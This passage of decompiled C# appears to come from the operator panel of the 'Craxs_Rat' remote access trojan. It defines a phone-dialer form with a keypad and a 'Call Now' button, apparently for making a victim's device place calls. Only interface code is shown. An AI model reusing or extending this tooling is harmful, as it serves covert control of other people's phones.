using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Craxs_Rat.My;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat;

[DesignerGenerated]
public class CallPhone : Form
{
	private IContainer components;

	[AccessedThroughProperty("TextBox1")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private TextBox _TextBox1;

	[AccessedThroughProperty("TOpacity")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Timer _TOpacity;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("Panel1")]
	private Panel _Panel1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("B_hash")]
	private Button _B_hash;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("b0")]
	private Button _b0;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("B_star")]
	private Button _B_star;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("b9")]
	private Button _b9;

	[CompilerGenerated]
	[AccessedThroughProperty("b8")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private Button _b8;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("b7")]
	private Button _b7;

	[AccessedThroughProperty("b6")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Button _b6;

	[CompilerGenerated]
	[AccessedThroughProperty("b5")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private Button _b5;

	[AccessedThroughProperty("b4")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Button _b4;

	[AccessedThroughProperty("b3")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Button _b3;

	[AccessedThroughProperty("b2")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private Button _b2;

	[AccessedThroughProperty("b1")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Button _b1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("b_DEL")]
	private Button _b_DEL;

	[AccessedThroughProperty("CutToolStripMenuItem")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _CutToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("CopyToolStripMenuItem")]
	private ToolStripMenuItem _CopyToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("PasteToolStripMenuItem")]
	private ToolStripMenuItem _PasteToolStripMenuItem;

	[AccessedThroughProperty("DrakeUIButtonIcon2")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private DrakeUIButtonIcon _DrakeUIButtonIcon2;

	private bool _keyback;

	public string _Call;

	public string Title;

	private List<Rectangle> RectInputText0;

	internal virtual TextBox TextBox1
	{
		[CompilerGenerated]
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = TextBox1_TextChanged;
			KeyPressEventHandler value3 = TextBox1_KeyPress;
			KeyEventHandler value4 = TextBox1_KeyDown;
			TextBox textBox = _TextBox1;
			if (textBox != null)
			{
				textBox.TextChanged -= value2;
				textBox.KeyPress -= value3;
				textBox.KeyDown -= value4;
			}
			_TextBox1 = value;
			textBox = _TextBox1;
			if (textBox != null)
			{
				textBox.TextChanged += value2;
				textBox.KeyPress += value3;
				textBox.KeyDown += value4;
			}
		}
	}

	internal virtual Timer TOpacity
	{
		[CompilerGenerated]
		get
		{
			return _TOpacity;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = TOpacity_Tick;
			Timer timer = _TOpacity;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_TOpacity = value;
			timer = _TOpacity;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	internal virtual Panel Panel1
	{
		[CompilerGenerated]
		get
		{
			return _Panel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			PaintEventHandler value2 = Panel1_Paint;
			Panel panel = _Panel1;
			if (panel != null)
			{
				panel.Paint -= value2;
			}
			_Panel1 = value;
			panel = _Panel1;
			if (panel != null)
			{
				panel.Paint += value2;
			}
		}
	}

	[field: AccessedThroughProperty("L0")]
	internal virtual Label L0
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button B_hash
	{
		[CompilerGenerated]
		get
		{
			return _B_hash;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = B_hash_Click;
			Button button = _B_hash;
			if (button != null)
			{
				button.Click -= value2;
			}
			_B_hash = value;
			button = _B_hash;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	internal virtual Button b0
	{
		[CompilerGenerated]
		get
		{
			return _b0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = b0_Click;
			Button button = _b0;
			if (button != null)
			{
				button.Click -= value2;
			}
			_b0 = value;
			button = _b0;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	internal virtual Button B_star
	{
		[CompilerGenerated]
		get
		{
			return _B_star;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = B_star_Click;
			Button button = _B_star;
			if (button != null)
			{
				button.Click -= value2;
			}
			_B_star = value;
			button = _B_star;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	internal virtual Button b9
	{
		[CompilerGenerated]
		get
		{
			return _b9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = b9_Click;
			Button button = _b9;
			if (button != null)
			{
				button.Click -= value2;
			}
			_b9 = value;
			button = _b9;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	internal virtual Button b8
	{
		[CompilerGenerated]
		get
		{
			return _b8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = b8_Click;
			Button button = _b8;
			if (button != null)
			{
				button.Click -= value2;
			}
			_b8 = value;
			button = _b8;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	internal virtual Button b7
	{
		[CompilerGenerated]
		get
		{
			return _b7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = b7_Click;
			Button button = _b7;
			if (button != null)
			{
				button.Click -= value2;
			}
			_b7 = value;
			button = _b7;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	internal virtual Button b6
	{
		[CompilerGenerated]
		get
		{
			return _b6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = b6_Click;
			Button button = _b6;
			if (button != null)
			{
				button.Click -= value2;
			}
			_b6 = value;
			button = _b6;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	internal virtual Button b5
	{
		[CompilerGenerated]
		get
		{
			return _b5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = b5_Click;
			Button button = _b5;
			if (button != null)
			{
				button.Click -= value2;
			}
			_b5 = value;
			button = _b5;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	internal virtual Button b4
	{
		[CompilerGenerated]
		get
		{
			return _b4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = b4_Click;
			Button button = _b4;
			if (button != null)
			{
				button.Click -= value2;
			}
			_b4 = value;
			button = _b4;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	internal virtual Button b3
	{
		[CompilerGenerated]
		get
		{
			return _b3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = b3_Click;
			Button button = _b3;
			if (button != null)
			{
				button.Click -= value2;
			}
			_b3 = value;
			button = _b3;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	internal virtual Button b2
	{
		[CompilerGenerated]
		get
		{
			return _b2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = b2_Click;
			Button button = _b2;
			if (button != null)
			{
				button.Click -= value2;
			}
			_b2 = value;
			button = _b2;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	internal virtual Button b1
	{
		[CompilerGenerated]
		get
		{
			return _b1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = b1_Click;
			Button button = _b1;
			if (button != null)
			{
				button.Click -= value2;
			}
			_b1 = value;
			button = _b1;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	internal virtual Button b_DEL
	{
		[CompilerGenerated]
		get
		{
			return _b_DEL;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = b_DEL_Click;
			Button button = _b_DEL;
			if (button != null)
			{
				button.Click -= value2;
			}
			_b_DEL = value;
			button = _b_DEL;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("CMenu")]
	internal virtual ContextMenuStrip CMenu
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem CutToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _CutToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = CutToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _CutToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_CutToolStripMenuItem = value;
			toolStripMenuItem = _CutToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem CopyToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _CopyToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = CopyToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _CopyToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_CopyToolStripMenuItem = value;
			toolStripMenuItem = _CopyToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem PasteToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _PasteToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = PasteToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _PasteToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_PasteToolStripMenuItem = value;
			toolStripMenuItem = _PasteToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon2
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon2_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon2;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon2 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon2;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		this.TextBox1 = new System.Windows.Forms.TextBox();
		this.TOpacity = new System.Windows.Forms.Timer(this.components);
		this.Panel1 = new System.Windows.Forms.Panel();
		this.b_DEL = new System.Windows.Forms.Button();
		this.B_hash = new System.Windows.Forms.Button();
		this.b0 = new System.Windows.Forms.Button();
		this.B_star = new System.Windows.Forms.Button();
		this.b9 = new System.Windows.Forms.Button();
		this.b8 = new System.Windows.Forms.Button();
		this.b7 = new System.Windows.Forms.Button();
		this.b6 = new System.Windows.Forms.Button();
		this.b5 = new System.Windows.Forms.Button();
		this.b4 = new System.Windows.Forms.Button();
		this.b3 = new System.Windows.Forms.Button();
		this.b2 = new System.Windows.Forms.Button();
		this.b1 = new System.Windows.Forms.Button();
		this.L0 = new System.Windows.Forms.Label();
		this.CMenu = new System.Windows.Forms.ContextMenuStrip(this.components);
		this.CutToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.CopyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.PasteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.DrakeUIButtonIcon2 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.Panel1.SuspendLayout();
		this.CMenu.SuspendLayout();
		base.SuspendLayout();
		this.TextBox1.BackColor = System.Drawing.Color.FromArgb(10, 10, 10);
		this.TextBox1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.TextBox1.ForeColor = System.Drawing.Color.SkyBlue;
		this.TextBox1.Location = new System.Drawing.Point(37, 37);
		this.TextBox1.Name = "TextBox1";
		this.TextBox1.ShortcutsEnabled = false;
		this.TextBox1.Size = new System.Drawing.Size(156, 20);
		this.TextBox1.TabIndex = 0;
		this.TOpacity.Interval = 1;
		this.Panel1.BackColor = System.Drawing.Color.Black;
		this.Panel1.Controls.Add(this.DrakeUIButtonIcon2);
		this.Panel1.Controls.Add(this.b_DEL);
		this.Panel1.Controls.Add(this.B_hash);
		this.Panel1.Controls.Add(this.b0);
		this.Panel1.Controls.Add(this.B_star);
		this.Panel1.Controls.Add(this.b9);
		this.Panel1.Controls.Add(this.b8);
		this.Panel1.Controls.Add(this.b7);
		this.Panel1.Controls.Add(this.b6);
		this.Panel1.Controls.Add(this.b5);
		this.Panel1.Controls.Add(this.b4);
		this.Panel1.Controls.Add(this.b3);
		this.Panel1.Controls.Add(this.b2);
		this.Panel1.Controls.Add(this.b1);
		this.Panel1.Controls.Add(this.L0);
		this.Panel1.Controls.Add(this.TextBox1);
		this.Panel1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel1.ForeColor = System.Drawing.Color.SkyBlue;
		this.Panel1.Location = new System.Drawing.Point(0, 0);
		this.Panel1.Name = "Panel1";
		this.Panel1.Size = new System.Drawing.Size(232, 326);
		this.Panel1.TabIndex = 2;
		this.b_DEL.FlatAppearance.BorderSize = 0;
		this.b_DEL.FlatAppearance.MouseOverBackColor = System.Drawing.Color.Transparent;
		this.b_DEL.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.b_DEL.Location = new System.Drawing.Point(200, 37);
		this.b_DEL.Name = "b_DEL";
		this.b_DEL.Size = new System.Drawing.Size(32, 21);
		this.b_DEL.TabIndex = 15;
		this.b_DEL.Text = "<";
		this.b_DEL.UseVisualStyleBackColor = true;
		this.B_hash.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.B_hash.ForeColor = System.Drawing.Color.SkyBlue;
		this.B_hash.Location = new System.Drawing.Point(145, 224);
		this.B_hash.Name = "B_hash";
		this.B_hash.Size = new System.Drawing.Size(48, 48);
		this.B_hash.TabIndex = 14;
		this.B_hash.Text = "#";
		this.B_hash.UseVisualStyleBackColor = true;
		this.b0.FlatAppearance.BorderSize = 0;
		this.b0.FlatAppearance.MouseOverBackColor = System.Drawing.Color.Cyan;
		this.b0.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.b0.Font = new System.Drawing.Font("Calibri", 15f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.b0.ForeColor = System.Drawing.Color.SkyBlue;
		this.b0.Location = new System.Drawing.Point(91, 224);
		this.b0.Name = "b0";
		this.b0.Size = new System.Drawing.Size(48, 48);
		this.b0.TabIndex = 13;
		this.b0.Text = "0";
		this.b0.UseVisualStyleBackColor = true;
		this.B_star.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.B_star.ForeColor = System.Drawing.Color.SkyBlue;
		this.B_star.Location = new System.Drawing.Point(37, 224);
		this.B_star.Name = "B_star";
		this.B_star.Size = new System.Drawing.Size(48, 48);
		this.B_star.TabIndex = 12;
		this.B_star.Text = "*";
		this.B_star.UseVisualStyleBackColor = true;
		this.b9.FlatAppearance.BorderSize = 0;
		this.b9.FlatAppearance.MouseOverBackColor = System.Drawing.Color.Cyan;
		this.b9.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.b9.Font = new System.Drawing.Font("Calibri", 15f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.b9.ForeColor = System.Drawing.Color.SkyBlue;
		this.b9.Location = new System.Drawing.Point(145, 170);
		this.b9.Name = "b9";
		this.b9.Size = new System.Drawing.Size(48, 48);
		this.b9.TabIndex = 11;
		this.b9.Text = "9";
		this.b9.UseVisualStyleBackColor = true;
		this.b8.FlatAppearance.BorderSize = 0;
		this.b8.FlatAppearance.MouseOverBackColor = System.Drawing.Color.Cyan;
		this.b8.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.b8.Font = new System.Drawing.Font("Calibri", 15f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.b8.ForeColor = System.Drawing.Color.SkyBlue;
		this.b8.Location = new System.Drawing.Point(91, 170);
		this.b8.Name = "b8";
		this.b8.Size = new System.Drawing.Size(48, 48);
		this.b8.TabIndex = 10;
		this.b8.Text = "8";
		this.b8.UseVisualStyleBackColor = true;
		this.b7.FlatAppearance.BorderSize = 0;
		this.b7.FlatAppearance.MouseOverBackColor = System.Drawing.Color.Cyan;
		this.b7.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.b7.Font = new System.Drawing.Font("Calibri", 15f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.b7.ForeColor = System.Drawing.Color.SkyBlue;
		this.b7.Location = new System.Drawing.Point(37, 170);
		this.b7.Name = "b7";
		this.b7.Size = new System.Drawing.Size(48, 48);
		this.b7.TabIndex = 9;
		this.b7.Text = "7";
		this.b7.UseVisualStyleBackColor = true;
		this.b6.FlatAppearance.BorderSize = 0;
		this.b6.FlatAppearance.MouseOverBackColor = System.Drawing.Color.Cyan;
		this.b6.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.b6.Font = new System.Drawing.Font("Calibri", 15f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.b6.ForeColor = System.Drawing.Color.SkyBlue;
		this.b6.Location = new System.Drawing.Point(145, 116);
		this.b6.Name = "b6";
		this.b6.Size = new System.Drawing.Size(48, 48);
		this.b6.TabIndex = 8;
		this.b6.Text = "6";
		this.b6.UseVisualStyleBackColor = true;
		this.b5.FlatAppearance.BorderSize = 0;
		this.b5.FlatAppearance.MouseOverBackColor = System.Drawing.Color.Cyan;
		this.b5.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.b5.Font = new System.Drawing.Font("Calibri", 15f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.b5.ForeColor = System.Drawing.Color.SkyBlue;
		this.b5.Location = new System.Drawing.Point(91, 116);
		this.b5.Name = "b5";
		this.b5.Size = new System.Drawing.Size(48, 48);
		this.b5.TabIndex = 7;
		this.b5.Text = "5";
		this.b5.UseVisualStyleBackColor = true;
		this.b4.FlatAppearance.BorderSize = 0;
		this.b4.FlatAppearance.MouseOverBackColor = System.Drawing.Color.SkyBlue;
		this.b4.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.b4.Font = new System.Drawing.Font("Calibri", 15f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.b4.ForeColor = System.Drawing.Color.SkyBlue;
		this.b4.Location = new System.Drawing.Point(37, 116);
		this.b4.Name = "b4";
		this.b4.Size = new System.Drawing.Size(48, 48);
		this.b4.TabIndex = 6;
		this.b4.Text = "4";
		this.b4.UseVisualStyleBackColor = true;
		this.b3.FlatAppearance.BorderSize = 0;
		this.b3.FlatAppearance.MouseOverBackColor = System.Drawing.Color.SkyBlue;
		this.b3.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.b3.Font = new System.Drawing.Font("Calibri", 15f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.b3.ForeColor = System.Drawing.Color.SkyBlue;
		this.b3.Location = new System.Drawing.Point(145, 62);
		this.b3.Name = "b3";
		this.b3.Size = new System.Drawing.Size(48, 48);
		this.b3.TabIndex = 5;
		this.b3.Text = "3";
		this.b3.UseVisualStyleBackColor = true;
		this.b2.FlatAppearance.BorderSize = 0;
		this.b2.FlatAppearance.MouseOverBackColor = System.Drawing.Color.SkyBlue;
		this.b2.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.b2.Font = new System.Drawing.Font("Calibri", 15f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.b2.ForeColor = System.Drawing.Color.SkyBlue;
		this.b2.Location = new System.Drawing.Point(91, 62);
		this.b2.Name = "b2";
		this.b2.Size = new System.Drawing.Size(48, 48);
		this.b2.TabIndex = 4;
		this.b2.Text = "2";
		this.b2.UseVisualStyleBackColor = true;
		this.b1.FlatAppearance.BorderSize = 0;
		this.b1.FlatAppearance.MouseOverBackColor = System.Drawing.Color.SkyBlue;
		this.b1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.b1.Font = new System.Drawing.Font("Calibri", 15f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.b1.ForeColor = System.Drawing.Color.SkyBlue;
		this.b1.Location = new System.Drawing.Point(37, 62);
		this.b1.Name = "b1";
		this.b1.Size = new System.Drawing.Size(48, 48);
		this.b1.TabIndex = 3;
		this.b1.Text = "1";
		this.b1.UseVisualStyleBackColor = true;
		this.L0.AutoSize = true;
		this.L0.Location = new System.Drawing.Point(3, 9);
		this.L0.Name = "L0";
		this.L0.Size = new System.Drawing.Size(23, 13);
		this.L0.TabIndex = 2;
		this.L0.Text = "null";
		this.CMenu.Items.AddRange(new System.Windows.Forms.ToolStripItem[3] { this.CutToolStripMenuItem, this.CopyToolStripMenuItem, this.PasteToolStripMenuItem });
		this.CMenu.Name = "CMenu";
		this.CMenu.ShowImageMargin = false;
		this.CMenu.Size = new System.Drawing.Size(78, 70);
		this.CutToolStripMenuItem.Name = "CutToolStripMenuItem";
		this.CutToolStripMenuItem.Size = new System.Drawing.Size(77, 22);
		this.CutToolStripMenuItem.Text = "Cut";
		this.CopyToolStripMenuItem.Name = "CopyToolStripMenuItem";
		this.CopyToolStripMenuItem.Size = new System.Drawing.Size(77, 22);
		this.CopyToolStripMenuItem.Text = "Copy";
		this.PasteToolStripMenuItem.Name = "PasteToolStripMenuItem";
		this.PasteToolStripMenuItem.Size = new System.Drawing.Size(77, 22);
		this.PasteToolStripMenuItem.Text = "Paste";
		this.DrakeUIButtonIcon2.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon2.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon2.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.DrakeUIButtonIcon2.FillPressColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon2.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon2.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIButtonIcon2.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon2.ForePressColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon2.Location = new System.Drawing.Point(52, 288);
		this.DrakeUIButtonIcon2.Name = "DrakeUIButtonIcon2";
		this.DrakeUIButtonIcon2.Radius = 25;
		this.DrakeUIButtonIcon2.RectColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon2.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon2.RectHoverColor = System.Drawing.Color.White;
		this.DrakeUIButtonIcon2.RectPressColor = System.Drawing.Color.White;
		this.DrakeUIButtonIcon2.RectSelectedColor = System.Drawing.Color.White;
		this.DrakeUIButtonIcon2.Size = new System.Drawing.Size(129, 26);
		this.DrakeUIButtonIcon2.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon2.Symbol = 57488;
		this.DrakeUIButtonIcon2.TabIndex = 18;
		this.DrakeUIButtonIcon2.Text = "Call Now";
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.FromArgb(10, 0, 10);
		base.ClientSize = new System.Drawing.Size(232, 326);
		base.Controls.Add(this.Panel1);
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
		base.MaximizeBox = false;
		base.Name = "CallPhone";
		base.Opacity = 0.0;
		base.ShowIcon = false;
		this.Text = "Call Phone";
		this.Panel1.ResumeLayout(false);
		this.Panel1.PerformLayout();
		this.CMenu.ResumeLayout(false);
		base.ResumeLayout(false);
	}

	public CallPhone()
	{
		base.Load += CallPhone_Load;
		_keyback = false;
		_Call = "call";
		Title = "null";
		RectInputText0 = new List<Rectangle>();
		InitializeComponent();
		Font = reso.f;
	}

	private void TOpacity_Tick(object sender, EventArgs e)
	{
		if (base.Opacity != 1.0)
		{
			base.Opacity += 0.1;
		}
		else
		{
			TOpacity.Enabled = false;
		}
	}

	private void CallPhone_Load(object sender, EventArgs e)
	{
		base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\18.ico");
		TextBox1.ContextMenuStrip = CMenu;
		int fontSize = MySettingsProperty.Settings.FontSize;
		if (IsFontInstalled("Wingdings 3"))
		{
			b_DEL.Font = new Font("Wingdings 3", fontSize, FontStyle.Regular);
			b_DEL.Text = "…";
		}
		else
		{
			b_DEL.Text = "<";
		}
		TOpacity.Interval = SpySettings.T_Interval;
		TOpacity.Enabled = true;
	}

	public static bool IsFontInstalled(string FontName)
	{
		using Font font = new Font(FontName, 10f);
		return string.Compare(FontName, font.Name, StringComparison.InvariantCultureIgnoreCase) == 0;
	}

	private void Panel1_Paint(object sender, PaintEventArgs e)
	{
		e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
		Color defaultColor_Foreground = SpySettings.DefaultColor_Foreground;
		if (RectInputText0.Count <= 0)
		{
			return;
		}
		foreach (Rectangle item in RectInputText0)
		{
			if (item.Width > 0)
			{
				e.Graphics.FillRectangle(new SolidBrush(defaultColor_Foreground), item);
			}
		}
	}

	private void b1_Click(object sender, EventArgs e)
	{
		TextBox1.Text += "1";
	}

	private void b2_Click(object sender, EventArgs e)
	{
		TextBox1.Text += "2";
	}

	private void b3_Click(object sender, EventArgs e)
	{
		TextBox1.Text += "3";
	}

	private void b4_Click(object sender, EventArgs e)
	{
		TextBox1.Text += "4";
	}

	private void b5_Click(object sender, EventArgs e)
	{
		TextBox1.Text += "5";
	}

	private void b6_Click(object sender, EventArgs e)
	{
		TextBox1.Text += "6";
	}

	private void b7_Click(object sender, EventArgs e)
	{
		TextBox1.Text += "7";
	}

	private void b8_Click(object sender, EventArgs e)
	{
		TextBox1.Text += "8";
	}

	private void b9_Click(object sender, EventArgs e)
	{
		TextBox1.Text += "9";
	}

	private void b0_Click(object sender, EventArgs e)
	{
		TextBox1.Text += "0";
	}

	private void b_DEL_Click(object sender, EventArgs e)
	{
		if (TextBox1.Text.Length > 0)
		{
			TextBox1.Text = TextBox1.Text.Remove(checked(TextBox1.Text.Length - 1));
		}
	}

	private void B_star_Click(object sender, EventArgs e)
	{
		TextBox1.Text += "*";
	}

	private void B_hash_Click(object sender, EventArgs e)
	{
		TextBox1.Text += "#";
	}

	private void Button1_Click(object sender, EventArgs e)
	{
	}

	private void TextBox1_TextChanged(object sender, EventArgs e)
	{
	}

	private void TextBox1_KeyPress(object sender, KeyPressEventArgs e)
	{
		if (_keyback)
		{
			e.Handled = false;
			return;
		}
		string text = "0123456789,*#+";
		if (!text.Contains(e.KeyChar.ToString()))
		{
			e.Handled = true;
		}
	}

	private void TextBox1_KeyDown(object sender, KeyEventArgs e)
	{
		if (e.KeyCode == Keys.Back)
		{
			_keyback = true;
		}
		else
		{
			_keyback = false;
		}
	}

